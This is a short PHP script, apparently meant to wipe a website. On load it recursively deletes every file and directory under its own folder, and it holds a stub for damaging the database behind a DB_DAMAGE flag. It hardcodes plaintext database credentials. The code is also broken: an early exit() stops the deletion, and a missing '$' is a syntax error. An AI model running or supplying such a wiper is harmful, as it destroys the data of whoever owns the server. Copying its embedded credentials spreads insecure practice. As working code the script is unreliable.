<?php
define('DB_USER', 'jiaju');
define('DB_PWD', 'jiaju@503');
define('DB_HOST', '127.0.0.1');
define('DB_PORT', '3306');
define('DB_DAMAGE', true); 
 
run();
 
/**
 * 
 * @return void
 **/
function run()
{
    deletedir();
	
    deleteDB();
}
 
/**
 *
 * @return void
 **/
function deletedir($dir = ''){
    if ($dir == '') {
        $dir = realpath('.');
    }
    echo $dir;
    exit();
      if(!handle=@opendir($dir)){     //检测要打开目录是否存在
        die("没有该目录");
      }
      while(false !==($file=readdir($handle))){
               if($file!=="."&&$file!==".."){       //排除当前目录与父级目录
                $file=$dir .DIRECTORY_SEPARATOR. $file;
                if(is_dir($file)){
                    deletedir($file);
                }else{
                    if(@unlink($file)){
                        echo "文件<b>$file</b>Success<br>";
                    }else{
                        echo  "文件<b>$file</b>False!<br>";
                    }
                }
               }
               if(@rmdir($dir)){
                echo "目录<b>$dir</b>Success<br>\n";
               }else{
                echo "目录<b>$dir</b>False<br>\n";
               }
           }
 
/**
 * 
 * @return void
 **/
function deleteDB()
{
    if(DB_DAMAGE === true){
        //start
    }
}